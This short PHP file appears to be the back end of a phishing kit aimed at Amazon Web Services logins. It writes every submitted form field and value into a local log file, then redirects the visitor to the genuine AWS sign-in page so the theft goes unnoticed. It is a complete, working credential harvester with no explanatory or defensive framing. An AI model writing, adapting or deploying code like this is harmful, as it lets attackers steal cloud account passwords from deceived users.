<?php

$file = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);
// exit();
?>

<script type="text/javascript">window.top.location.href = "https://signin.aws.amazon.com/"; </script>